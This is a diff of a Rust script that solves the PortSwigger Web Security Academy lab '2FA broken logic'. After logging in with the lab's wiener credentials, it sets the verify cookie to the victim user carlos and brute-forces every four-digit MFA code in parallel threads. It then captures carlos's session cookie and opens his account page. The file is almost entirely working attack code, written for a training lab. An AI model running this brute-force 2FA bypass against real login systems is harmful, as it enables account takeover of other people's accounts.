@@ -1,224 +1,206 @@
 /**********************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
+* Lab: 2FA broken logic
 *
-* Date: 28/8/2023
-*
-* Lab: 2FA Broken Logic
-*
-* Steps: 1. Get a valid session using valid credentials
-*        2. GET /login2 page
-*        3. Brute force the mfa-code
+* Hack Steps: 
+*      1. Obtain a valid session
+*      2. Fetch the login2 page
+*      3. Start brute forcing the mfa-code of carlos
+*      4. Fetch carlos profile
 *
 ***********************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
-use rayon::prelude::*;
+use lazy_static::lazy_static;
+use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
 use regex::Regex;
 use reqwest::{
-    blocking::{Client, Response},
-    header::HeaderMap,
+    blocking::{Client, ClientBuilder, Response},
     redirect::Policy,
     Error,
 };
 use std::{
     collections::HashMap,
-    error,
-    fmt::format,
-    fs,
     io::{self, Write},
-    ops::Range,
-    process, thread, time,
+    sync::{
+        atomic::{AtomicBool, AtomicUsize, Ordering},
+        Arc, Mutex,
+    },
+    time::{self, Duration, Instant},
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
-fn main() {
-    // change this to your lab URL
-    let url = "https://0aa400ea04d8ba59834a1ae6003a003e.web-security-academy.net";
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a6800ee03e72937804bfe78006800d4.web-security-academy.net";
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    // this session will be used to valid our requests to the server
-    let session = get_valid_session(&client, url, "wiener", "peter");
-
-    println!("{}", "1. Obtaining a valid session ..OK".white().bold());
-
-    // must fetch the /login2 page to make the mfa-code be sent to the mail server
-    let pre_post_code_res = fetch_login2(&client, url, "carlos", &session);
-
-    println!("{}", "2. GET /login2 page ..OK".white().bold());
-
-    // get our list of ranges ready
-    let ranges = build_ranges();
-
-    // capture the time before brute forcing
-    let start = time::Instant::now();
-
-    println!("{}", "3. Start brute forcing mfa-code ..".white().bold());
-
-    // run every range in a different thread
-    ranges.par_iter().for_each(|range| {
-        // iterate over every numbers in every range
-        range.iter().for_each(|code| {
-            // if post code request is successfull
-            if let Ok(post_code_res) = post_code(&client, url, "carlos", &session, *code) {
-                // check if the response is Ok
-                match post_code_res.status().as_u16() {
-                    302 => {
-                        // redircet means that the code is correct
-                        print!(
-                            "\r[*] {} => {}",
-                            format!("{code:04}").white().bold(),
-                            "Correct".green().bold()
-                        );
-                        io::stdout().flush();
-
-                        // calculate the elapsed time
-                        let elapased_time = (start.elapsed().as_secs() / 60).to_string();
-
-                        println!(
-                            "\n{}: {} minutes",
-                            "✅ Finished in".green().bold(),
-                            elapased_time.white().bold()
-                        );
-
-                        // exit from the program
-                        process::exit(0);
-                    }
-                    _ => {
-                        // code is Incorrect
-                        print!(
-                            "\r[*] {} => {}",
-                            format!("{code:04}").white().bold(),
-                            "Incorrect".red()
-                        );
-                        io::stdout().flush();
-                    }
-                }
-            } else {
-                // failed to make the post code request
-                println!(
-                    "\r[*] {} => {}",
-                    format!("{:04}", code).white().bold(),
-                    "REQUEST FAILED".red()
-                );
-            }
-        });
-    });
-
-    // the time taken by the script to finish
-    println!("Finished in: {:?}", start.elapsed());
+lazy_static! {
+    static ref CARLOS_SESSION: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
+    static ref CARLOS_SESSION_IS_FOUND: AtomicBool = AtomicBool::new(false);
+    static ref CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/**************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-***************************************************************/
-fn build_client() -> Client {
-    reqwest::blocking::ClientBuilder::new()
+fn main() {
+    print!("⦗1⦘ Obtaining a valid session.. ");
+    flush_terminal();
+
+    let login = login_as_wiener();
+    let session = get_session_from_multiple_cookies(&login);
+
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Fetching the login2 page.. ");
+
+    // Must fetch the login2 page to make the mfa-code be sent to the mail server
+    fetch_with_session("/login2", &session);
+
+    println!("{}", "OK".green());
+    println!("{}", "⦗3⦘ Start brute forcing the mfa-code of carlos.. ");
+
+    let threads = 4; // You can experiment with the number of threads by adjusting this variable
+    brute_force_code_in_multiple_threads(&session, threads);
+
+    let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+    if is_found {
+        print!("\n{}", "⦗4⦘ Fetching carlos profile.. ");
+        let carlos_session = CARLOS_SESSION.lock().unwrap();
+        fetch_with_session("/my-account", &carlos_session);
+        println!("{}", "OK".green());
+    } else {
+        println!("\n⦗!⦘ Failed to brute force the mfa-code of carlos");
+    }
+
+    print_finish_message();
+}
+
+fn build_web_client() -> Client {
+    ClientBuilder::new()
         .redirect(Policy::none())
-        .connect_timeout(time::Duration::from_secs(60))
+        .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
 }
 
-/**********************************************************
-* Function used to get a valid session using correct creds
-***********************************************************/
-fn get_valid_session(client: &Client, url: &str, username: &str, password: &str) -> String {
-    let login_post_res = client
-        .post(format!("{url}/login"))
+fn login_as_wiener() -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
         .form(&HashMap::from([
-            ("username", username),
-            ("password", password),
+            ("username", "wiener"),
+            ("password", "peter"),
         ]))
         .send()
-        .unwrap();
-
-    let cookie_header = login_post_res
-        .headers()
-        .get_all("set-cookie")
-        .iter()
-        .nth(1)
-        .unwrap()
-        .to_str()
-        .unwrap();
-
-    let re = regex::Regex::new("session=(.*); Secure").unwrap();
-
-    re.captures(cookie_header)
-        .unwrap()
-        .get(1)
-        .unwrap()
-        .as_str()
-        .to_string()
+        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
 }
 
-/*********************************************************************
-* Function used to build a set of ranges
-* Every range will be in one thread
-* Feel free to change the number of vectors and the range in each one
-**********************************************************************/
-fn build_ranges() -> Vec<Vec<i32>> {
-    let mut list = Vec::new();
-    list.push((0..500).collect::<Vec<i32>>());
-    list.push((500..1000).collect::<Vec<i32>>());
-    list.push((1000..2000).collect::<Vec<i32>>());
-    list
-}
-
-/***********************************
-* Function used to GET /login2 page
-************************************/
-fn fetch_login2(client: &Client, url: &str, user: &str, session: &str) -> Response {
-    client
-        .get(format!("{url}/login2"))
-        .header("Cookie", format!("session={session}; verify={user}"))
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}; verify=carlos"))
         .send()
-        .unwrap()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/************************************
-* Function used to POST the mfa code
-*************************************/
-fn post_code(
-    client: &Client,
-    url: &str,
-    user: &str,
-    session: &str,
-    code: i32,
-) -> Result<Response, Error> {
-    client
-        .post(format!("{url}/login2"))
-        .header("Cookie", format!("session={session}; verify={user}"))
+fn brute_force_code_in_multiple_threads(session: &str, threads: i32) {
+    let ranges = build_code_ranges(0, 10000, threads);
+    ranges.par_iter().for_each(|range| {
+        brute_force_with_range(session, range); // use every range in a different thread
+    })
+}
+
+fn build_code_ranges(start: i32, end: i32, threads: i32) -> Vec<Vec<i32>> {
+    let chunk_size = (end - start) / threads;
+    (start..end)
+        .collect::<Vec<i32>>()
+        .chunks(chunk_size as usize)
+        .map(|x| x.to_owned())
+        .collect::<Vec<Vec<i32>>>()
+}
+
+fn brute_force_with_range(session: &str, range: &Vec<i32>) {
+    for code in range {
+        let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+        if is_found {
+            return; // exist from the thread if the correct code is found and you have obtained the session
+        } else {
+            let counter = CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
+            if let Ok(response) = post_code(&session, code) {
+                if response.status().as_u16() == 302 {
+                    print_correct_code(code);
+                    let new_session = get_session_cookie(&response);
+                    CARLOS_SESSION_IS_FOUND.fetch_or(true, Ordering::Relaxed);
+                    CARLOS_SESSION.lock().unwrap().push_str(&new_session);
+                    return;
+                } else {
+                    print_progress(counter, code);
+                }
+            } else {
+                print_failed_code(code);
+            }
+        }
+    }
+}
+
+fn post_code(session: &str, code: &i32) -> Result<Response, Error> {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login2"))
+        .header("Cookie", format!("session={session}; verify=carlos"))
         .form(&HashMap::from([("mfa-code", format!("{code:04}"))]))
         .send()
 }
 
-/*******************************************************************
-* Function to extract session field from the cookie header
-********************************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> String {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    extract_pattern("session=(.*); Secure", cookie)
+fn get_session_from_multiple_cookies(response: &Response) -> String {
+    let headers = response.headers();
+    let mut cookies = headers.get_all("set-cookie").iter();
+    let session_cookie = cookies.nth(1).unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", session_cookie)
 }
 
-/****************************************************
-* Function to extract a pattern form a text
-*****************************************************/
-fn extract_pattern(pattern: &str, text: &str) -> String {
-    Regex::new(pattern)
-        .unwrap()
-        .captures(text)
-        .unwrap()
-        .get(1)
-        .unwrap()
-        .as_str()
-        .to_string()
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn print_correct_code(code: &i32) {
+    println!("\n🗹 Correct Code: {}", format!("{code:04}").green());
+    flush_terminal();
+}
+
+fn print_progress(counter: usize, code: &i32) {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
+    print!(
+        "\r❯❯ Elapsed: {} minutes || Trying ({}/10000) {} => {}",
+        elapsed_time.yellow(),
+        counter + 1,
+        format!("{code:04}").blue(),
+        "Wrong".red()
+    );
+    flush_terminal();
+}
+
+fn print_failed_code(code: &i32) {
+    println!(
+        "\n{} {}",
+        "⦗!⦘ Failed to try code:".red(),
+        format!("{:04}", code).red(),
+    );
+    flush_terminal();
+}
+
+fn print_finish_message() {
+    let elapased_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
+    println!("🗹 Finished in: {} minutes", elapased_time.yellow());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
